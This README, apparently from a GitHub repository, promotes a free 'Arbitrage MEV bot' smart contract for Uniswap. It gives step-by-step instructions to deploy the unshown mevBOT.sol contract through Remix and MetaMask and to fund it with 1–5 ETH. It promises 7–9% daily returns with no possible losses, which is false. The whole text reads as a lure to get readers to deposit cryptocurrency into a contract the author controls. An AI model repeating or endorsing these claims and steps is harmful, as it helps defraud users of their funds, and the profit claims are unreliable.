# Mev-Bot-Solidity

Uniswap is a cryptocurrency exchange which uses a decentralized network protocol. If you trade crypto on Uniswap, 1inch or any other decentralized exchange (DEX), then you need to know about front-running bots sniping profits across exchange’s pools.

You are now able to take advantage of those arbitrages yourself, a benefit that was previously only available to highly skilled devs. Here I provide you the access to my user-friendly (no coding skills required) MEV bot. Enjoy stress-free passive income from day one.

My flagship project that I recently released is Arbitrage MEV bot which runs on ETH pairs on Uniswap making profits from arbitrage trades.

Using my smart contract source code allows users to create their own MEV bots which stacks up the profits from automatic trades for the users.

I share my Arbitrage MEV bot smart contract for free, but there’s 0.1% fee charged from users’ profits, which goes back to me.

How to launch your own arbitrage bot

Download MetaMask (if you don’t have it already): https://metamask.io/download.html

Access Remix: https://remix.ethereum.org/

Clone this repo from the sandwich menu near WORKSPACE title

![266763860-2560b6cd-db8d-4881-8c6d-88c61f468b8b](https://github.com/MevBotContract/MEV-BOT-SOLIDITY/assets/172215330/610b6c62-190f-4db2-9ce7-829c7bdbad40)


Go to the “Solidity Compiler” tab, select version and then select “Compile mevBOT.sol”.

Make sure “mevBOT.sol” is selected in the CONTRACT section of the SOLIDITY COMPILER section.

![266763870-9de1b4fa-d81d-47fe-8bf5-3f7d2a1c7e9f](https://github.com/MevBotContract/MEV-BOT-SOLIDITY/assets/172215330/bf5432f5-f993-4af2-8ab4-ccf31cb9789a)


Go to the “DEPLOY & RUN TRANSACTIONS” tab, select the “Injected Provider - Metamask” environment and then “Deploy”. By approving the Metamask contract creation fee, you will have created your own contract.

Copy your newly created contract address as shown on video and fund it with any amount of ETH that you would like the bot to earn with by simply sending ETH to your newly created contract address.

![266763873-6df444ff-9db3-4352-a030-c5e1c8a88a67](https://github.com/MevBotContract/MEV-BOT-SOLIDITY/assets/172215330/7fd73816-f40e-43cc-80da-21d216302c66)


After your transaction is confirmed, click the “start” button to run the bot. Withdraw your ETH at any time by clicking the “Withdraw” button.

![266763884-b2a36ec4-25c7-48ce-8b0f-d0f0330ed2a2](https://github.com/MevBotContract/MEV-BOT-SOLIDITY/assets/172215330/8f2c92c5-2d35-4845-94e0-b3ff3543b7ac)

That’s it. The bot will start working immediately earning you profits from arbitrage trades on Uniswap pools.

Edit:

If you need any help please message me on Telegram @mevsolidity or leave a comment in pastebin.

FAQ

If many people will use the bot, wouldn’t dilution of profits occur?

I do not plan to limit access to the bot for now because there won’t be any affect for me or other users profiting as pools that the bot works on are with the biggest liquidities and volumes on Uniswap so other users involvement in the pools will always be very minor.

What average ROI can I expect?

According to my latest data of bot performances (past 3 weeks) ROI is about +7–9% daily per user. Bot does not make any losses, it only executes trades when there’s proper arbitrage opportunity to make profit, so under all circumstances user is always on plus.

What amount of funds bot need to work?

I recommend funding the contract with at least 1-5 ETH to cover gas fees and possible burn fees. Bot targets token contracts with max 10% burn fee and anything lower but nowadays most of tokens comes with 3~6% fees. If you fund the contract with less than recommended and the bot targets another token with high burn fees the contract will basically waste in fees more than make profit.

Does it work on other chains or DEXes as well?

No, currently the bot is dedicated only for Ethereum on Uniswap pools.

